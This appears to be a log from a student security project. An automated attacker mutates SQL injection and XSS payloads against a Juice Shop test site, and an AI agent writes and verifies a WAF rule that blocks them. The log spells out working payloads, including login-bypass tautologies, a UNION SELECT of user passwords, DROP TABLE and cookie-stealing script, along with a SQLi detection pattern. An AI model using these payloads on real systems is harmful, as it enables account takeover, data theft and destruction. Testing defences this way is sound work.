@@ -1,0 +1,111 @@
+[mutate] WARNING: falling back to line-split parsing for response: '["\'); OR (\') OR (SELECT 1 FROM (SELECT SLEEP(1)) n)--\', " OR 1=(SELECT 1 FROM (SELECT *) w WHERE 1=1)--"]'
+wave 1: 6/20 bypassed, 14/20 blocked
+--- wave 1: running defensive agent ---
+
+=== /rest/user/login tripped -> rule_id 1000000 ===
+  [/rest/user/login] agent: Endpoint: /rest/user/login
+Assigned rule_id: 1000000 (already bound to your rule tools - you never pass it)
+5 bypassing requests have been recorded for this endpoint; the 5 below are a representative subset, chosen to cover as many distinct attack variants as possible (not the most recent), so other variants of the same kinds likely exist - generalize rather than match only these.
+Sample bypassing requests, grouped by attack family (a request line, plus its body for POSTs - the payload is in the query string or the body):
+
+[sqli] (5 example(s)):
+  /rest/user/login?_wave_marker=w1-sqli-02-1 - body: {"email": " OR 1=1 /* True SQLi Payload */", "password": "x"}
+  /rest/user/login?_wave_marker=w1-sqli-08-1 - body: {"email": " OR 1=1;--", "password": "x"}
+  /rest/user/login?_wave_marker=w1-sqli-01-2 - body: {"email": " OR 1=1 /*#*/ --", "password": "x"}
+  /rest/user/login?_wave_marker=w1-sqli-03-2 - body: {"email": "admin@juice-sh.op--", "password": "x"}
+  /rest/user/login?_wave_marker=w1-sqli-04-2 - body: {"email": "%29 OR %28%271%27%3D%271", "password": "x"}
+
+Begin.
+  [/rest/user/login] -> calling read_current_rule({})
+  [/rest/user/login] -> calling read_waf_logs({'lines': 40})
+  [/rest/user/login] <- read_current_rule result: No existing rule for id:1000000 yet - this will be a new rule.
+  [/rest/user/login] <- read_waf_logs result: [{'type': 'text', 'text': '2026/11/19 18:47:12 403 id=949110 msg="Inbound Anomaly Score Exceeded (Total Score: 10)" request=POST /rest/user/login?_wave_marker=w1-sqli-01-1 HTTP/1.1\n2026/11/19 18:47:12 403 id=949110 msg="Inbound Anomaly Score Exceeded (Total Score: 5)" request=POST /rest/user/login?_wave_marker=w1-sqli-03-1 HTTP/1.1\n2026/11/19 18:47:12 403 id=949110 msg="Inbound Anomaly Score Exceeded (Total Score: 15)" request=POST /rest/user/login?_wave_marker=w1-sqli-04-1 HTTP/1.1\n2026/11/19 18:47:12 403 id=949110 msg="Inbound Anomaly Score Exceeded (Total Score: 15)" request=GET /rest/products/search?_wave_marker=w1-sqli-05-1&q=x%27+union+select+id%2Cemail%2Cpassword%2C%271%27%2C%271%27%2C%271%27%2C%271%27%2C%271%27+from+users-- HTTP/1.1\n2026/11/19 18:47:12 403 id=949110 msg="Inbound Anomaly Score Exceeded (Total Score: 5)" request=GET /rest/products/search?_wave_marker=w1-sqli-07-1&q=1%27+ORDER+BY+10+%2F%2A+order-by-10+%2A%2F%2C+%271%27+ORDER+BY+10%2F%2A%2A%2F HTTP/1.1\n2026/11/19 18:47:12 403 id=949110 msg="Inbound Anomaly Score Exceeded (Total Score: 20)" request=GET /rest/products/search?_wave_marker=w1-xss-01-1&q=%3CsCrIpT%3EalErT%281%29%3C%2FsCrIpT%3E HTTP/1.1\n2026/11/19 18:47:12 403 id=949110 msg="Inbound Anomaly Score Exceeded (Total Score: 20)" request=GET /rest/products/search?_wave_marker=w1-xss-02-1&q=%3CImg+SRC%3DX+onerror%3Dalert%281%29%3E HTTP/1.1\n2026/11/19 18:47:12 403 id=949110 msg="Inbound Anomaly Score Exceeded (Total Score: 20)" request=GET /rest/products/search?_wave_marker=w1-xss-03-1&q=%3Csvg%2F+OnLoad%3Dalert%281%29%3E HTTP/1.1\n2026/11/19 18:47:12 403 id=949110 msg="Inbound Anomaly Score Exceeded (Total Score: 35)" request=POST /api/Feedbacks?_wave_marker=w1-xss-04-1 HTTP/1.1\n2026/11/19 18:47:12 403 id=949110 msg="Inbound Anomaly Score Exceeded (Total Score: 30)" request=GET /rest/products/search?_wave_marker=w1-xss-05-1&q=%26%23x3C%3Bscript%26%23x3E%3Balert%28document.cookie%29%26%23x3C%3B%2Fscript%26%23x3E%3B HTTP/1.1\n2026/11/19 18:47:12 403 id=949110 msg="Inbound Anomaly Score Exceeded (Total Score: 20)" request=POST /api/Feedbacks?_wave_marker=w1-xss-06-1 HTTP/1.1\n2026/11/19 18:47:12 403 id=949110 msg="Inbound Anomaly Score Exceeded (Total Score: 20)" request=POST /api/Feedbacks?_wave_marker=w1-xss-07-1 HTTP/1.1\n2026/11/19 18:47:12 403 id=949110 msg="Inbound Anomaly Score Exceeded (Total Score: 20)" request=GET /rest/products/search?_wave_marker=w1-xss-08-1&q=%3Csvg%3E%3CSCRIPT%3Ealert%281%29%3C%2FSCRIPT%3E%3C%2Fsvg%3E HTTP/1.1\n2026/11/19 18:47:12 403 id=949110 msg="Inbound Anomaly Score Exceeded (Total Score: 5)" request=POST /rest/user/login?_wave_marker=w1-sqli-02-2 HTTP/1.1', 'id': 'lc_ccdb920e-ca16-421c-9404-3dc7b38d1432'}]
+  [/rest/user/login] -> calling write_idempotent_rule({'attack_pattern': '(?i)(?:\\b(?:or|and)\\b\\s*(?:%28|\\()?\\s*(?:%27|%22|[\'"])?\\s*\\w+\\s*(?:%27|%22|[\'"])?\\s*(?:=|%3D|<>|!=|%3C%3E)\\s*(?:%27|%22|[\'"])?\\s*\\w+|\\bunion\\b[\\s\\S]{0,30}?\\bselect\\b|\\bselect\\b[\\s\\S]{0,60}?\\bfrom\\b|/\\*[\\s\\S]*?\\*/|%2[Ff]\\*|(?:--|%2[Dd]%2[Dd])\\s*$|;\\s*(?:--|%2[Dd]%2[Dd]|#|%23)|\\b(?:sleep|benchmark|pg_sleep)\\s*\\(|\\bwaitfor\\s+delay\\b|\\bdrop\\s+table\\b|\\binsert\\s+into\\b|\\bupdate\\b\\s+\\w+\\s+\\bset\\b|\\bor\\b\\s+(?:%27|\')?1(?:%27|\')?\\s*(?:=|%3D))', 'description': 'SQL injection attempt on login (tautology, comment terminator, inline comment or union/select) - rule 1000000'})
+  [/rest/user/login] <- write_idempotent_rule result: Added new rule id:1000000 to ai_generated_rules.conf.
+  [/rest/user/login] -> calling test_waf_configuration({})
+  [/rest/user/login] <- test_waf_configuration result: [{'type': 'text', 'text': 'OK\n2026/11/19 18:47:53 [warn] 4642#4642: "ssl_stapling" ignored, issuer certificate not found for certificate "/etc/nginx/conf/server.crt"\nnginx: [warn] "ssl_stapling" ignored, issuer certificate not found for certificate "/etc/nginx/conf/server.crt"\n2026/11/19 18:47:53 [notice] 4642#4642: ModSecurity-nginx v1.0.4 (rules loaded inline/local/remote: 0/852/0)\n2026/11/19 18:47:53 [notice] 4642#4642: libmodsecurity3 version 3.0.16\nnginx: the configuration file /etc/nginx/nginx.conf syntax is ok\nnginx: configuration file /etc/nginx/nginx.conf test is successful', 'id': 'lc_f0fd37df-2a31-4751-b724-3d780cdd6bbf'}]
+  [/rest/user/login] -> calling reload_waf({})
+  [/rest/user/login] <- reload_waf result: [{'type': 'text', 'text': 'OK\n2026/11/19 18:47:55 [warn] 4648#4648: "ssl_stapling" ignored, issuer certificate not found for certificate "/etc/nginx/conf/server.crt"\nnginx: [warn] "ssl_stapling" ignored, issuer certificate not found for certificate "/etc/nginx/conf/server.crt"\n2026/11/19 18:47:55 [notice] 4648#4648: ModSecurity-nginx v1.0.4 (rules loaded inline/local/remote: 0/852/0)\n2026/11/19 18:47:55 [notice] 4648#4648: libmodsecurity3 version 3.0.16\n2026/11/19 18:47:55 [notice] 4648#4648: signal process started', 'id': 'lc_917f8af2-4dcd-458d-9938-bf82af4ef1d6'}]
+  [/rest/user/login] -> calling verify_rule({})
+  [/rest/user/login] <- verify_rule result: {
+  "endpoint": "/rest/user/login",
+  "attack_replay": {
+    "replayed": 5,
+    "now_blocked": 5,
+    "still_bypassing": [],
+    "not_replayable": 0
+  },
+  "benign_check": {
+    "sent": 12,
+    "falsely_blocked": [],
+    "note": "covers all endpoints - rules apply site-wide, not just to the endpoint being fixed"
+  },
+  "coverage_check": {
+    "protected_replayed": 0,
+    "regressions": [],
+    "note": "attacks an earlier verified rule blocked, on any endpoint - each must still be blocked"
+  },
+  "verdict": "PASS"
+}
+  [/rest/user/login] agent: **Result: PASS**
+
+**What I found:** No prior rule existed for id 1000000, so this is a fresh rule — no existing coverage to preserve. All 5 recorded bypasses on `/rest/user/login` were SQLi auth-bypass attempts in the JSON `email` field:
+- Tautologies: `" OR 1=1 /* ... */"`, `" OR 1=1;--"`
+- Comment terminators appended to a real account: `admin@juice-sh.op--`
+- Inline comment obfuscation: `" OR 1=1 /*#*/ --"`
+- URL-encoded tautology: `%29 OR %28%271%27%3D%271` (i.e. `') OR ('1'='1`)
+
+**Rule written:** a single case-insensitive alternation covering:
+- `OR`/`AND` followed by a `x=y` comparison, with optional literal or percent-encoded quotes/parens (`%27`, `%28`, `%29`, `%3D`) — catches both plain and encoded tautologies;
+- `UNION ... SELECT` and `SELECT ... FROM` (generalizing beyond the login samples, since the same family appears elsewhere in the logs);
+- inline `/* ... */` comments and its encoded form;
+- `--` at end of value, and `;` followed by `--`/`#` — this is what catches the `admin@juice-sh.op--` style without blocking hyphens mid-string;
+- common injection verbs: `sleep()/benchmark()/pg_sleep()`, `WAITFOR DELAY`, `DROP TABLE`, `INSERT INTO`, `UPDATE ... SET`.
+
+**Deliberate narrowing to avoid false positives:** a bare `#` or `--` anywhere in a value is *not* matched (only trailing `--`, or after `;`), since ordinary passwords and text legitimately contain those characters.
+
+**Verification:** config test OK, WAF reloaded, then `verify_rule` returned PASS — 5/5 recorded bypasses now blocked, 0 of 12 benign requests falsely blocked, 0 coverage regressions. None of the replayed entries looked like benign traffic misfiled as an attack. Caveat: passing means the rule covers the evidence it was built from; novel encodings (e.g. double-URL-encoding, heavy whitespace/comment splitting like `OR/**/1=1`) could still require future widening.
+  [/rest/user/login] token usage over 6 model call(s): input=39147 (cache_read=30960, cache_write=8175, uncached=12), output=3325
+[mutate] adaptive: seed "' OR 1=1--" fed 1 bypassed / 1 blocked example(s)
+[mutate] adaptive: seed "' OR '1'='1" fed 1 bypassed / 1 blocked example(s)
+[mutate] adaptive: seed "admin@juice-sh.op'--" fed 1 bypassed / 1 blocked example(s)
+[mutate] adaptive: seed "') OR ('1'='1" fed 1 bypassed / 1 blocked example(s)
+[mutate] adaptive: seed "x' UNION SELECT id,email,password,'1','1','1','1','1' FROM Users--" fed 0 bypassed / 1 blocked example(s)
+[mutate] adaptive: seed "'; DROP TABLE Products;--" fed 1 bypassed / 0 blocked example(s)
+[mutate] adaptive: seed "1' ORDER BY 10--" fed 0 bypassed / 1 blocked example(s)
+[mutate] adaptive: seed "' OR 1=1;--" fed 1 bypassed / 0 blocked example(s)
+[mutate] adaptive: seed '<script>alert(1)</script>' fed 0 bypassed / 1 blocked example(s)
+[mutate] adaptive: seed '<img src=x onerror=alert(1)>' fed 0 bypassed / 1 blocked example(s)
+[mutate] adaptive: seed '<svg/onload=alert(1)>' fed 0 bypassed / 1 blocked example(s)
+[mutate] adaptive: seed '<iframe src="javascript:alert(`xss`)">' fed 0 bypassed / 1 blocked example(s)
+[mutate] adaptive: seed '"><script>alert(document.cookie)</script>' fed 0 bypassed / 1 blocked example(s)
+[mutate] adaptive: seed '<body onload=alert(1)>' fed 0 bypassed / 1 blocked example(s)
+[mutate] adaptive: seed '<a href="javascript:alert(1)">click</a>' fed 0 bypassed / 1 blocked example(s)
+[mutate] adaptive: seed '<svg><script>alert(1)</script></svg>' fed 0 bypassed / 1 blocked example(s)
+wave 2: 2/20 bypassed, 18/20 blocked
+--- wave 2: running defensive agent ---
+No tripped endpoints - nothing to do.
+--- wave 2: no endpoint tripped, nothing to defend ---
+[mutate] adaptive: seed "' OR 1=1--" fed 0 bypassed / 1 blocked example(s)
+[mutate] adaptive: seed "' OR '1'='1" fed 0 bypassed / 1 blocked example(s)
+[mutate] adaptive: seed "admin@juice-sh.op'--" fed 1 bypassed / 0 blocked example(s)
+[mutate] adaptive: seed "') OR ('1'='1" fed 1 bypassed / 0 blocked example(s)
+[mutate] adaptive: seed "x' UNION SELECT id,email,password,'1','1','1','1','1' FROM Users--" fed 0 bypassed / 2 blocked example(s)
+[mutate] adaptive: seed "'; DROP TABLE Products;--" fed 0 bypassed / 2 blocked example(s)
+[mutate] WARNING: falling back to line-split parsing for response: '["DROP\\u20 tabletS;--", ";\\t DROP\\tTABLE\\tProducts;--"]'
+[mutate] adaptive: seed "1' ORDER BY 10--" fed 0 bypassed / 2 blocked example(s)
+[mutate] adaptive: seed "' OR 1=1;--" fed 0 bypassed / 2 blocked example(s)
+[mutate] adaptive: seed '<script>alert(1)</script>' fed 0 bypassed / 1 blocked example(s)
+[mutate] adaptive: seed '<img src=x onerror=alert(1)>' fed 0 bypassed / 1 blocked example(s)
+[mutate] adaptive: seed '<svg/onload=alert(1)>' fed 0 bypassed / 1 blocked example(s)
+[mutate] adaptive: seed '<iframe src="javascript:alert(`xss`)">' fed 0 bypassed / 1 blocked example(s)
+[mutate] adaptive: seed '"><script>alert(document.cookie)</script>' fed 0 bypassed / 1 blocked example(s)
+[mutate] adaptive: seed '<body onload=alert(1)>' fed 0 bypassed / 1 blocked example(s)
+[mutate] adaptive: seed '<a href="javascript:alert(1)">click</a>' fed 0 bypassed / 1 blocked example(s)
+[mutate] adaptive: seed '<svg><script>alert(1)</script></svg>' fed 0 bypassed / 1 blocked example(s)
+wave 3: 2/20 bypassed, 18/20 blocked
+--- wave 3: running defensive agent ---
+No tripped endpoints - nothing to do.
+--- wave 3: no endpoint tripped, nothing to defend ---
+metrics written to /home/nicle/capstone/attacker-pipeline/metrics/run_adaptive_20261119_124532.csv
+agent runs written to /home/nicle/capstone/attacker-pipeline/metrics/run_adaptive_20261119_124532_agent.csv
